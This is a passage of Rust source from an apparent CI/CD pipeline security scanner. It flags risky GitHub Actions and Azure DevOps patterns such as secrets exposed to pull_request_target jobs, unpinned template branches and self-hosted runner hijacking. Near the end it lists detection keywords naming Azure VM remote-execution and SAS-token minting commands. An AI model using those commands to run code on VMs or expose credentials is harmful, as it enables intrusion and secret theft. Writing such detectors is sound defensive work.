    let severity = match trigger.as_str() {
        "pull_request_target" => Severity::Critical,
        "pr" => Severity::High,
        _ => return Vec::new(),
    };

    // Collect steps that hold authority (HasAccessTo a Secret or Identity)
    let mut steps_with_authority: Vec<NodeId> = Vec::new();
    let mut authority_targets: Vec<NodeId> = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let mut step_holds_authority = false;
        for edge in graph.edges_from(step.id) {
            if edge.kind != EdgeKind::HasAccessTo {
                continue;
            }
            if let Some(target) = graph.node(edge.to) {
                if matches!(target.kind, NodeKind::Secret | NodeKind::Identity) {
                    step_holds_authority = true;
                    if !authority_targets.contains(&target.id) {
                        authority_targets.push(target.id);
                    }
                }
            }
        }
        if step_holds_authority {
            steps_with_authority.push(step.id);
        }
    }

    if steps_with_authority.is_empty() {
        return Vec::new();
    }

    let n = steps_with_authority.len();
    let mut nodes_involved = steps_with_authority.clone();
    nodes_involved.extend(authority_targets);

    vec![Finding {
        severity,
        category: FindingCategory::TriggerContextMismatch,
        path: None,
        nodes_involved,
        message: format!(
            "Workflow triggered by {trigger} with secret/identity access — {n} step(s) hold authority that attacker-controlled code could reach"
        ),
        recommendation: Recommendation::Manual {
            action: "Use a separate workflow triggered by workflow_run (not pull_request_target) for privileged operations, or ensure no checkout of the PR head ref occurs before secret use".into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::default(),
}]
}

/// Rule: authority (secret/identity) flows into an opaque external workflow via DelegatesTo.
///
/// For each Step node: find all `DelegatesTo` edges to Image nodes where the trust zone
/// is not FirstParty. If the same step also has `HasAccessTo` any Secret or Identity,
/// emit one finding per delegation edge.
pub fn cross_workflow_authority_chain(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        // Collect authority sources this step holds
        let authority_nodes: Vec<&_> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
            .collect();

        if authority_nodes.is_empty() {
            continue;
        }

        // Find each DelegatesTo edge to a non-FirstParty Image
        for edge in graph.edges_from(step.id) {
            if edge.kind != EdgeKind::DelegatesTo {
                continue;
            }
            let Some(target) = graph.node(edge.to) else {
                continue;
            };
            if target.kind != NodeKind::Image {
                continue;
            }
            if target.trust_zone == TrustZone::FirstParty {
                continue;
            }

            let severity = match target.trust_zone {
                TrustZone::Untrusted => Severity::Critical,
                TrustZone::ThirdParty => Severity::High,
                TrustZone::FirstParty => continue,
            };

            let authority_names: Vec<String> =
                authority_nodes.iter().map(|n| n.name.clone()).collect();
            let authority_label = authority_names.join(", ");

            let mut nodes_involved = vec![step.id, target.id];
            nodes_involved.extend(authority_nodes.iter().map(|n| n.id));

            findings.push(Finding {
                severity,
                category: FindingCategory::CrossWorkflowAuthorityChain,
                path: None,
                nodes_involved,
                message: format!(
                    "'{}' delegates to '{}' ({:?}) while holding authority ({}) — authority chain extends into opaque external workflow",
                    step.name, target.name, target.trust_zone, authority_label
                ),
                recommendation: Recommendation::Manual {
                    action: format!(
                        "Pin '{}' to a full SHA digest; audit what authority the called workflow receives",
                        target.name
                    ),
                },
                source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
});
        }
    }

    findings
}

/// Rule: circular DelegatesTo chain — workflow calls itself transitively.
///
/// Iterative DFS over `DelegatesTo` edges. Detects back edges (gray → gray) and
/// collects all nodes that participate in any cycle. If any cycles exist, emits
/// a single High-severity finding listing all cycle members.
pub fn authority_cycle(graph: &AuthorityGraph) -> Vec<Finding> {
    let n = graph.nodes.len();
    if n == 0 {
        return Vec::new();
    }

    // Pre-build adjacency list for DelegatesTo edges only.
    let mut delegates_to: Vec<Vec<NodeId>> = vec![Vec::new(); n];
    for edge in &graph.edges {
        if edge.kind == EdgeKind::DelegatesTo && edge.from < n && edge.to < n {
            delegates_to[edge.from].push(edge.to);
        }
    }

    let mut color: Vec<u8> = vec![0u8; n]; // 0=white, 1=gray, 2=black
    let mut cycle_nodes: std::collections::BTreeSet<NodeId> = std::collections::BTreeSet::new();

    for start in 0..n {
        if color[start] != 0 {
            continue;
        }
        color[start] = 1;
        let mut stack: Vec<(NodeId, usize)> = vec![(start, 0)];

        loop {
            let len = stack.len();
            if len == 0 {
                break;
            }
            let (node_id, edge_idx) = stack[len - 1];
            if edge_idx < delegates_to[node_id].len() {
                stack[len - 1].1 += 1;
                let neighbor = delegates_to[node_id][edge_idx];
                if color[neighbor] == 1 {
                    // Back edge: cycle found. Collect every node between `neighbor`
                    // (the cycle start) and `node_id` (the cycle end) along the
                    // current DFS stack. All stack entries are gray by construction,
                    // so we walk the stack from `neighbor` to the top.
                    let cycle_start_idx =
                        stack.iter().position(|&(n, _)| n == neighbor).unwrap_or(0);
                    for &(n, _) in &stack[cycle_start_idx..] {
                        cycle_nodes.insert(n);
                    }
                } else if color[neighbor] == 0 {
                    color[neighbor] = 1;
                    stack.push((neighbor, 0));
                }
            } else {
                color[node_id] = 2;
                stack.pop();
            }
        }
    }

    if cycle_nodes.is_empty() {
        return Vec::new();
    }

    vec![Finding {
        severity: Severity::High,
        category: FindingCategory::AuthorityCycle,
        path: None,
        nodes_involved: cycle_nodes.into_iter().collect(),
        message:
            "Circular delegation detected — workflow calls itself transitively, creating unbounded privilege escalation paths"
                .into(),
        recommendation: Recommendation::Manual {
            action: "Break the delegation cycle — a workflow must not directly or transitively call itself".into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::default(),
}]
}

/// Rule: privileged workflow (OIDC/federated identity) with no provenance attestation step.
///
/// Scoped to workflows that actually use OIDC/federated identity (an Identity node with
/// `META_OIDC = "true"` is present). If no node in the graph has `META_ATTESTS = "true"`,
/// emit one Info-severity finding listing the steps with HasAccessTo an OIDC identity.
pub fn uplift_without_attestation(graph: &AuthorityGraph) -> Vec<Finding> {
    // Scope: only fire when the graph has at least one OIDC-capable Identity
    let oidc_identity_ids: Vec<NodeId> = graph
        .nodes_of_kind(NodeKind::Identity)
        .filter(|n| {
            n.metadata
                .get(META_OIDC)
                .map(|v| v == "true")
                .unwrap_or(false)
        })
        .map(|n| n.id)
        .collect();

    if oidc_identity_ids.is_empty() {
        return Vec::new();
    }

    // Bail if any node already has META_ATTESTS = true
    let has_attestation = graph.nodes.iter().any(|n| {
        n.metadata
            .get(META_ATTESTS)
            .map(|v| v == "true")
            .unwrap_or(false)
    });
    if has_attestation {
        return Vec::new();
    }

    // Collect steps that have HasAccessTo an OIDC identity
    let mut steps_using_oidc: Vec<NodeId> = Vec::new();
    for edge in &graph.edges {
        if edge.kind != EdgeKind::HasAccessTo {
            continue;
        }
        if oidc_identity_ids.contains(&edge.to) && !steps_using_oidc.contains(&edge.from) {
            steps_using_oidc.push(edge.from);
        }
    }

    if steps_using_oidc.is_empty() {
        return Vec::new();
    }

    let n = steps_using_oidc.len();
    let mut nodes_involved = steps_using_oidc.clone();
    nodes_involved.extend(oidc_identity_ids);

    vec![Finding {
        severity: Severity::Info,
        category: FindingCategory::UpliftWithoutAttestation,
        path: None,
        nodes_involved,
        message: format!(
            "{n} step(s) use OIDC/federated identity but no provenance attestation step was detected — artifact integrity cannot be verified"
        ),
        recommendation: Recommendation::Manual {
            action: "Add 'actions/attest-build-provenance' after your build step (GHA) to provide SLSA provenance. See https://docs.github.com/en/actions/security-guides/using-artifact-attestations".into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::default(),
}]
}

/// Rule: step writes to the environment gate ($GITHUB_ENV / ##vso[task.setvariable]).
///
/// Authority leaking through the environment gate propagates to subsequent steps
/// outside the explicit graph edges. Severity:
/// - Untrusted step: Critical (attacker-controlled values inject into pipeline env)
/// - Step with secret/identity access: High (secrets may leak into env)
/// - Otherwise: Medium (still a propagation risk)
pub fn self_mutating_pipeline(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let writes_gate = step
            .metadata
            .get(META_WRITES_ENV_GATE)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !writes_gate {
            continue;
        }

        // BUG-4: ADO ##vso[task.setvariable] with a plain-literal value (e.g.
        // an integer counter derived from internal logic) is NOT secret exfiltration.
        // META_SETVARIABLE_ADO marks all ADO setvariable calls; skip the rule only
        // when the call is ADO-origin AND the written value contains no $(secretRef).
        // GHA >> $GITHUB_ENV writes never set META_SETVARIABLE_ADO so they are
        // unaffected by this guard.
        let is_ado_plain_value_write = step
            .metadata
            .get(META_SETVARIABLE_ADO)
            .map(|v| v == "true")
            .unwrap_or(false)
            && !step
                .metadata
                .get(META_ENV_GATE_WRITES_SECRET_VALUE)
                .map(|v| v == "true")
                .unwrap_or(false);
        if is_ado_plain_value_write {
            continue;
        }

        // Collect authority targets the step has HasAccessTo
        let authority_nodes: Vec<&_> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| matches!(n.kind, NodeKind::Secret | NodeKind::Identity))
            .collect();

        let is_untrusted = step.trust_zone == TrustZone::Untrusted;
        let has_authority = !authority_nodes.is_empty();

        let severity = if is_untrusted {
            Severity::Critical
        } else if has_authority {
            Severity::High
        } else {
            Severity::Medium
        };

        let mut nodes_involved = vec![step.id];
        nodes_involved.extend(authority_nodes.iter().map(|n| n.id));

        let message = if is_untrusted {
            format!(
                "Untrusted step '{}' writes to the environment gate — attacker-controlled values can inject into subsequent steps' environment",
                step.name
            )
        } else if has_authority {
            let authority_label: Vec<String> =
                authority_nodes.iter().map(|n| n.name.clone()).collect();
            format!(
                "Step '{}' writes to the environment gate while holding authority ({}) — secrets may leak into pipeline environment",
                step.name,
                authority_label.join(", ")
            )
        } else {
            format!(
                "Step '{}' writes to the environment gate — values can propagate into subsequent steps' environment",
                step.name
            )
        };

        findings.push(Finding {
            severity,
            category: FindingCategory::SelfMutatingPipeline,
            path: None,
            nodes_involved,
            message,
            recommendation: Recommendation::Manual {
                action: "Avoid writing secrets or attacker-controlled values to $GITHUB_ENV / $GITHUB_PATH / pipeline variables. Use explicit step outputs with narrow scoping instead.".into(),
            },
            source: FindingSource::BuiltIn,
                extras: FindingExtras::default(),
});
    }

    findings
}

/// Rule: PR-triggered pipeline performs a self checkout.
///
/// When a PR/PRT-triggered pipeline checks out the repository, attacker-controlled
/// code from the fork lands on the runner. Any subsequent step that reads workspace
/// files (which is almost all of them) can exfiltrate secrets or tamper with build
/// artifacts. Fires only when the graph has a PR-class trigger.
pub fn checkout_self_pr_exposure(graph: &AuthorityGraph) -> Vec<Finding> {
    // Only fires when the graph has a PR/PRT trigger
    let trigger = graph.metadata.get(META_TRIGGER).map(|s| s.as_str());
    let is_pr_context = matches!(trigger, Some("pr") | Some("pull_request_target"));
    if !is_pr_context {
        return vec![];
    }

    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let is_checkout_self = step
            .metadata
            .get(META_CHECKOUT_SELF)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !is_checkout_self {
            continue;
        }
        findings.push(Finding {
            category: FindingCategory::CheckoutSelfPrExposure,
            severity: Severity::High,
            message: format!(
                "PR-triggered pipeline checks out the repository at step '{}' — \
                 attacker-controlled code from the fork lands on the runner and is \
                 readable by all subsequent steps",
                step.name
            ),
            path: None,
            nodes_involved: vec![step.id],
            recommendation: Recommendation::Manual {
                action: "Use `persist-credentials: false` and avoid reading workspace \
                         files in subsequent privileged steps. Consider `checkout: none` \
                         for jobs that only need pipeline config, not source code."
                    .into(),
            },
            source: FindingSource::BuiltIn,
            // Splitting privileged from PR-checkout jobs is a meaningful
            // restructure — Medium effort.
            extras: FindingExtras {
                time_to_fix: Some(crate::finding::FixEffort::Medium),
                ..FindingExtras::default()
            },
        });
    }
    findings
}

/// Rule: ADO variable group consumed by a PR-triggered job.
///
/// Variable groups hold secrets scoped to pipelines. When a PR-triggered job has
/// `HasAccessTo` a Secret/Identity carrying `META_VARIABLE_GROUP = "true"`, those
/// secrets cross into an untrusted-contributor execution context.
pub fn variable_group_in_pr_job(graph: &AuthorityGraph) -> Vec<Finding> {
    // Only fires when the pipeline has a PR trigger
    let trigger = graph
        .metadata
        .get(META_TRIGGER)
        .map(|s| s.as_str())
        .unwrap_or("");
    if trigger != "pull_request_target" && trigger != "pr" {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let accessed_var_groups: Vec<&_> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| {
                (n.kind == NodeKind::Secret || n.kind == NodeKind::Identity)
                    && n.metadata
                        .get(META_VARIABLE_GROUP)
                        .map(|v| v == "true")
                        .unwrap_or(false)
            })
            .collect();

        if !accessed_var_groups.is_empty() {
            let group_names: Vec<_> = accessed_var_groups
                .iter()
                .map(|n| n.name.as_str())
                .collect();
            findings.push(Finding {
                severity: Severity::Critical,
                category: FindingCategory::VariableGroupInPrJob,
                path: None,
                nodes_involved: std::iter::once(step.id)
                    .chain(accessed_var_groups.iter().map(|n| n.id))
                    .collect(),
                message: format!(
                    "PR-triggered step '{}' accesses variable group(s) [{}] — secrets cross into untrusted PR execution context",
                    step.name,
                    group_names.join(", ")
                ),
                recommendation: Recommendation::CellosRemediation {
                    reason: format!(
                        "PR-triggered step '{}' can exfiltrate variable group secrets via untrusted code",
                        step.name
                    ),
                    spec_hint: "cellos run --network deny-all --policy requireEgressDeclared,requireRuntimeSecretDelivery".into(),
                },
                source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
});
        }
    }

    findings
}

/// Rule: self-hosted agent pool used by a PR-triggered pipeline that also checks out the repo.
///
/// All three factors present — self-hosted pool + PR trigger + `checkout:self` — combine to
/// allow an attacker to land malicious git hooks on the shared runner via a PR. Those hooks
/// persist across pipeline runs and execute with full pipeline authority.
pub fn self_hosted_pool_pr_hijack(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = graph
        .metadata
        .get(META_TRIGGER)
        .map(|s| s.as_str())
        .unwrap_or("");
    if trigger != "pull_request_target" && trigger != "pr" {
        return Vec::new();
    }

    // Check if any Image node is self-hosted
    let has_self_hosted_pool = graph.nodes_of_kind(NodeKind::Image).any(|n| {
        n.metadata
            .get(META_SELF_HOSTED)
            .map(|v| v == "true")
            .unwrap_or(false)
    });

    if !has_self_hosted_pool {
        return Vec::new();
    }

    // Check if any Step does checkout:self
    let checkout_steps: Vec<&_> = graph
        .nodes_of_kind(NodeKind::Step)
        .filter(|n| {
            n.metadata
                .get(META_CHECKOUT_SELF)
                .map(|v| v == "true")
                .unwrap_or(false)
        })
        .collect();

    if checkout_steps.is_empty() {
        return Vec::new();
    }

    // All three factors present: self-hosted + PR trigger + checkout:self.
    // Collect self-hosted pool nodes for the finding.
    let pool_nodes: Vec<&_> = graph
        .nodes_of_kind(NodeKind::Image)
        .filter(|n| {
            n.metadata
                .get(META_SELF_HOSTED)
                .map(|v| v == "true")
                .unwrap_or(false)
        })
        .collect();

    let mut nodes_involved: Vec<NodeId> = pool_nodes.iter().map(|n| n.id).collect();
    nodes_involved.extend(checkout_steps.iter().map(|n| n.id));

    vec![Finding {
        severity: Severity::Critical,
        category: FindingCategory::SelfHostedPoolPrHijack,
        path: None,
        nodes_involved,
        message:
            "PR-triggered pipeline uses self-hosted agent pool with checkout:self — enables git hook injection persisting across pipeline runs on the shared runner"
                .into(),
        recommendation: Recommendation::Manual {
            action: "Run PR pipelines on Microsoft-hosted (ephemeral) agents, or disable checkout:self for PR-triggered jobs on self-hosted pools".into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::default(),
}]
}

// ── shared_self_hosted_pool_no_isolation ──────────────────────────────────────
//
// ADO self-hosted agent pools retain their workspace between pipeline runs.
// Without `workspace: { clean: all }` a build that runs on the shared agent
// can leave behind malicious files, compiled artefacts, or git hooks that
// persist for the next run — which may be a privileged deployment pipeline.
//
// Microsoft-hosted agents are ephemeral (Image node has no META_SELF_HOSTED).

/// Rule G1: ADO self-hosted pool without workspace isolation.
///
/// Fires when any Image node (pool) in an ADO pipeline has `META_SELF_HOSTED`
/// set but does NOT have `META_WORKSPACE_CLEAN` set.  Microsoft-hosted pools
/// are ephemeral and are never flagged.
pub fn shared_self_hosted_pool_no_isolation(graph: &AuthorityGraph) -> Vec<Finding> {
    let platform = graph.metadata.get(META_PLATFORM).map(|s| s.as_str());
    if platform != Some("azure-devops") {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for pool in graph.nodes_of_kind(NodeKind::Image) {
        let is_self_hosted = pool
            .metadata
            .get(META_SELF_HOSTED)
            .map(|v| v == "true")
            .unwrap_or(false);

        if !is_self_hosted {
            continue;
        }

        let has_clean = pool
            .metadata
            .get(META_WORKSPACE_CLEAN)
            .map(|v| v == "true")
            .unwrap_or(false);

        if has_clean {
            continue;
        }

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::SharedSelfHostedPoolNoIsolation,
            path: None,
            nodes_involved: vec![pool.id],
            message: format!(
                "Self-hosted pool '{}' has no workspace isolation (workspace: {{clean: all/true}} not set); \
                a previous pipeline run can pollute the workspace for the next — including privileged deployment jobs",
                pool.name
            ),
            recommendation: Recommendation::Manual {
                action: "Add `workspace: { clean: all }` to every job that uses a self-hosted pool, \
                    or migrate to Microsoft-hosted (ephemeral) agents for untrusted builds.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Rule: ADO service connection with broad/unknown scope and no OIDC federation,
/// reachable from a PR-triggered job.
///
/// Static credentials backing broad-scope service connections can carry
/// subscription-wide Azure RBAC. When a PR-triggered step has `HasAccessTo` one of
/// these, PR-author-controlled code can move laterally into the Azure tenant.
pub fn service_connection_scope_mismatch(graph: &AuthorityGraph) -> Vec<Finding> {
    let trigger = graph
        .metadata
        .get(META_TRIGGER)
        .map(|s| s.as_str())
        .unwrap_or("");
    if trigger != "pull_request_target" && trigger != "pr" {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let broad_scs: Vec<&_> = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::HasAccessTo)
            .filter_map(|e| graph.node(e.to))
            .filter(|n| {
                n.kind == NodeKind::Identity
                    && n.metadata
                        .get(META_SERVICE_CONNECTION)
                        .map(|v| v == "true")
                        .unwrap_or(false)
                    && n.metadata
                        .get(META_OIDC)
                        .map(|v| v != "true")
                        .unwrap_or(true) // not OIDC-federated
                    && matches!(
                        n.metadata.get(META_IDENTITY_SCOPE).map(|s| s.as_str()),
                        Some("broad") | Some("Broad") | None // unknown scope is also a risk
                    )
            })
            .collect();

        for sc in &broad_scs {
            findings.push(Finding {
                severity: Severity::High,
                category: FindingCategory::ServiceConnectionScopeMismatch,
                path: None,
                nodes_involved: vec![step.id, sc.id],
                message: format!(
                    "PR-triggered step '{}' accesses service connection '{}' with broad/unknown scope and no OIDC federation — static credential may have subscription-wide Azure RBAC",
                    step.name, sc.name
                ),
                recommendation: Recommendation::CellosRemediation {
                    reason: "Broad-scope service connection reachable from PR code — CellOS egress isolation limits lateral movement even when connection cannot be immediately rescoped".into(),
                    spec_hint: "cellos run --network deny-all --policy requireEgressDeclared".into(),
                },
                source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
});
        }
    }

    findings
}

/// ADO-only rule: a `resources.repositories[]` entry resolves against a
/// mutable target — no `ref:` field (default branch) or `refs/heads/<x>`
/// without a SHA. Whoever owns that branch can inject steps into every
/// consuming pipeline at the next run.
///
/// Pinned forms that do NOT fire:
///   - `refs/tags/<x>` — git tags (treated as immutable in practice)
///   - bare 40-char hex SHA — explicit commit pin
///   - `refs/heads/<sha>` where the trailing segment is a 40-char hex SHA
///
/// Mutable forms that DO fire:
///   - field absent — defaults to the repo's default branch
///   - `refs/heads/<branch>` with a normal branch name
///   - bare branch name (`main`, `master`, `develop`, ...)
///
/// Suppression: a repository entry declared with NO `ref:` field AND no
/// in-file consumer (`extends:`, `template: x@alias`, or `checkout: alias`)
/// is skipped. This catches purely vestigial declarations — a leftover
/// `resources.repositories[]` entry that no one references is not an active
/// attack surface. An entry with an explicit `ref: refs/heads/<x>` always
/// fires regardless of in-file usage, because the explicit branch ref
/// signals an intent to consume (the consumer is typically in an included
/// template file outside the per-file scan boundary).
pub fn template_extends_unpinned_branch(graph: &AuthorityGraph) -> Vec<Finding> {
    let raw = match graph.metadata.get(META_REPOSITORIES) {
        Some(s) => s,
        None => return Vec::new(),
    };
    let entries: Vec<serde_json::Value> = match serde_json::from_str(raw) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut findings = Vec::new();
    for entry in entries {
        let alias = match entry.get("alias").and_then(|v| v.as_str()) {
            Some(a) => a,
            None => continue,
        };
        let name = entry.get("name").and_then(|v| v.as_str()).unwrap_or(alias);
        let repo_type = entry
            .get("repo_type")
            .and_then(|v| v.as_str())
            .unwrap_or("git");
        let ref_value = entry.get("ref").and_then(|v| v.as_str());
        let used = entry.get("used").and_then(|v| v.as_bool()).unwrap_or(false);

        let classification = classify_repository_ref(ref_value);
        let resolved = match classification {
            RepositoryRefClass::Pinned => continue,
            RepositoryRefClass::DefaultBranch => {
                // Default-branch entries are only flagged when an in-file
                // consumer actually references the alias. Without an explicit
                // `ref:` and without a consumer there's no evidence the
                // declaration is active — likely vestigial.
                if !used {
                    continue;
                }
                "default branch (no ref:)".to_string()
            }
            RepositoryRefClass::MutableBranch(b) => format!("mutable branch '{b}'"),
        };

        let pinned_example = format!("ref: <40-char-sha>  # commit on {name}");
        // Per-finding fingerprint anchor: the alias is the natural
        // discriminator between two `resources.repositories[]` entries
        // declared in one pipeline file. Without this anchor, all
        // unpinned-template findings on a single file would collapse to
        // one fingerprint (v3 collision class). See
        // `compute_fingerprint` and ISC-16.
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::TemplateExtendsUnpinnedBranch,
            path: None,
            nodes_involved: Vec::new(),
            message: format!(
                "ADO resources.repositories alias '{alias}' (type: {repo_type}, name: {name}) resolves to {resolved} — \
                 whoever owns that branch can inject steps at the next pipeline run"
            ),
            recommendation: Recommendation::PinAction {
                current: ref_value.unwrap_or("(default branch)").to_string(),
                pinned: pinned_example,
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::with_anchor(format!("alias={alias}")),
        });
    }

    findings
}

/// ADO-only rule: a `resources.repositories[]` entry pins to a *feature-class*
/// branch — anything outside the platform-blessed set
/// (`main`, `master`, `release/*`, `hotfix/*`).
///
/// Strictly stronger signal than [`template_extends_unpinned_branch`]:
///
/// * `template_extends_unpinned_branch` fires on *any* mutable branch ref
///   (including `main` and `master`) — the abstract "ref isn't pinned to a
///   SHA or tag" finding.
/// * This rule fires only on the subset that's *worse than main*: a developer
///   feature branch (`feature/*`, `topic/*`, `dev/*`, `wip/*`, `users/*`,
///   `develop`, …) where push protection is typically weaker than the trunk.
///
/// The two findings co-fire intentionally — they describe different angles of
/// the same risk class. `template_extends_unpinned_branch` says "this isn't
/// pinned"; this rule adds "and the branch it points to is one any developer
/// can push to without a code review gate".
///
/// Detection inputs are identical to `template_extends_unpinned_branch`:
/// `META_REPOSITORIES` JSON array, with the same `used` suppression for
/// `ref`-absent entries.
///
/// Pinned forms (40-char SHA, `refs/tags/<x>`, `refs/heads/<sha>`) do not
/// fire — same classification helper as the parent rule.
///
/// Default-branch (no-`ref:`) entries do not fire from this rule. The default
/// branch is conventionally `main`/`master`, and even when it's something
/// else the *implicit* default-branch contract carries less risk than an
/// explicit feature-branch pin (the default branch usually has the strongest
/// protection in the org). The plain "this isn't pinned" surface is left to
/// `template_extends_unpinned_branch`.
pub fn template_repo_ref_is_feature_branch(graph: &AuthorityGraph) -> Vec<Finding> {
    let raw = match graph.metadata.get(META_REPOSITORIES) {
        Some(s) => s,
        None => return Vec::new(),
    };
    let entries: Vec<serde_json::Value> = match serde_json::from_str(raw) {
        Ok(v) => v,
        Err(_) => return Vec::new(),
    };

    let mut findings = Vec::new();
    for entry in entries {
        let alias = match entry.get("alias").and_then(|v| v.as_str()) {
            Some(a) => a,
            None => continue,
        };
        let name = entry.get("name").and_then(|v| v.as_str()).unwrap_or(alias);
        let repo_type = entry
            .get("repo_type")
            .and_then(|v| v.as_str())
            .unwrap_or("git");
        let ref_value = entry.get("ref").and_then(|v| v.as_str());

        // Only explicit refs are candidates here — the parent rule covers the
        // ref-absent case via the default-branch path.
        let branch = match classify_repository_ref(ref_value) {
            RepositoryRefClass::MutableBranch(b) => b,
            RepositoryRefClass::Pinned | RepositoryRefClass::DefaultBranch => continue,
        };

        if !is_feature_class_branch(&branch) {
            continue;
        }

        let pinned_example = format!("ref: <40-char-sha>  # commit on {name}");
        // Per-finding fingerprint anchor — see ISC-17 / sibling rule.
        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::TemplateRepoRefIsFeatureBranch,
            path: None,
            nodes_involved: Vec::new(),
            message: format!(
                "ADO resources.repositories alias '{alias}' (type: {repo_type}, name: {name}) is pinned to feature-class branch '{branch}' — \
                 weaker than even an unpinned trunk pin: any developer with write access to that branch can inject pipeline steps without a code review on main"
            ),
            recommendation: Recommendation::PinAction {
                current: ref_value.unwrap_or("(default branch)").to_string(),
                pinned: pinned_example,
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::with_anchor(format!("alias={alias},branch={branch}")),
        });
    }

    findings
}

/// Returns `true` for ADO branch names that are *not* part of the
/// platform-blessed trunk/release set. The blessed set:
///
///   - `main`, `master`
///   - `release/*`, `releases/*`
///   - `hotfix/*`, `hotfixes/*`
///
/// Everything else — `feature/*`, `topic/*`, `dev/*`, `wip/*`, `users/*`,
/// `develop`, ad-hoc names — is treated as feature-class.
///
/// Comparison is case-insensitive and prefix-stripped of any leading
/// `refs/heads/` (the [`classify_repository_ref`] caller already strips it,
/// but defensive normalisation keeps this helper standalone-testable).
fn is_feature_class_branch(branch: &str) -> bool {
    let normalised = branch
        .trim()
        .trim_start_matches("refs/heads/")
        .to_ascii_lowercase();

    if normalised.is_empty() {
        return false;
    }

    // Exact-match trunk names.
    if matches!(normalised.as_str(), "main" | "master") {
        return false;
    }

    // Prefix-match release / hotfix branches (with or without trailing slash).
    const TRUNK_PREFIXES: &[&str] = &["release/", "releases/", "hotfix/", "hotfixes/"];
    for p in TRUNK_PREFIXES {
        if normalised == p.trim_end_matches('/') || normalised.starts_with(p) {
            return false;
        }
    }

    true
}

// ── Command-line credential leakage helpers ─────────────
//
// These two rules (`vm_remote_exec_via_pipeline_secret`,
// `short_lived_sas_in_command_line`) inspect inline script bodies stamped on
// Step nodes by the parser as `META_SCRIPT_BODY`. They are intentionally
// heuristic — the goal is reliable detection of the corpus pattern, not 100%
// false-positive cleanliness. They're allowed to co-fire on the same step:
// each describes a different angle of the same risk class.

/// Names of the Azure VM remote-execution primitives we care about.
/// Match is case-insensitive on the script body.
const VM_REMOTE_EXEC_TOKENS: &[&str] = &[
    "set-azvmextension",
    "invoke-azvmruncommand",
    "az vm run-command",
    "az vm extension set",
];

/// Substrings that indicate a SAS token has just been minted in this script.
/// Match is case-insensitive on the script body.
const SAS_MINT_TOKENS: &[&str] = &[
    "new-azstoragecontainersastoken",
    "new-azstorageblobsastoken",
    "new-azstorageaccountsastoken",
    "az storage container generate-sas",
    "az storage blob generate-sas",
    "az storage account generate-sas",
];

/// Argument-passing keywords that put a value on the process command line and
/// thus into ARM extension status / OS process logs.
const COMMAND_LINE_SINK_TOKENS: &[&str] = &[
    "commandtoexecute",
    "scriptarguments",
    "--arguments",
    "-argumentlist",
    "--scripts",
    "-scriptstring",
];

/// Returns the names of pipeline secret/SAS variables (`$(NAME)`) that the
/// step references via `HasAccessTo` a Secret. Used to spot interpolation of
/// pipeline secrets into command-line strings.
fn step_secret_var_names(graph: &AuthorityGraph, step_id: NodeId) -> Vec<&str> {
    graph
        .edges_from(step_id)
        .filter(|e| e.kind == EdgeKind::HasAccessTo)
        .filter_map(|e| graph.node(e.to))
        .filter(|n| n.kind == NodeKind::Secret)
        .map(|n| n.name.as_str())
        .collect()
}

/// Returns the names of all Secret nodes a step has `HasAccessTo`.
/// Used by the script-aware ADO rules to constrain pattern matches to
/// `$(VAR)` references that actually resolve to secrets in this graph.
fn step_secret_names(graph: &AuthorityGraph, step_id: NodeId) -> Vec<String> {
    graph
        .edges_from(step_id)
        .filter(|e| e.kind == EdgeKind::HasAccessTo)
        .filter_map(|e| graph.node(e.to))
        .filter(|n| n.kind == NodeKind::Secret)
        .map(|n| n.name.clone())
        .collect()
}

/// Heuristic: returns true if a value-bearing variable named `var_name` appears
/// to be interpolated into `script_body` (PowerShell `$var` / `"$var"` /
/// `` `"$var`" `` form, or ADO `$(var)` form). Case-insensitive.
fn body_interpolates_var(script_body: &str, var_name: &str) -> bool {
    if var_name.is_empty() {
        return false;
    }
    let body = script_body.to_lowercase();
    let name = var_name.to_lowercase();
    // ADO macro form
    let dollar_paren = format!("$({name})");
    if body.contains(&dollar_paren) {
        return true;
    }
    // PowerShell variable form: must be followed by a non-identifier char to
    // avoid matching `$varSomething` as `$var`.
    let needle = format!("${name}");
    let mut search_from = 0usize;
    while let Some(pos) = body[search_from..].find(&needle) {
        let abs = search_from + pos;
        let end = abs + needle.len();
        let next = body.as_bytes().get(end).copied();
        let is_word = matches!(next, Some(c) if c.is_ascii_alphanumeric() || c == b'_');
        if !is_word {
            return true;
        }
        search_from = end;
    }
    false
}

/// Returns true if `script` contains `$(secret)` and that occurrence sits on
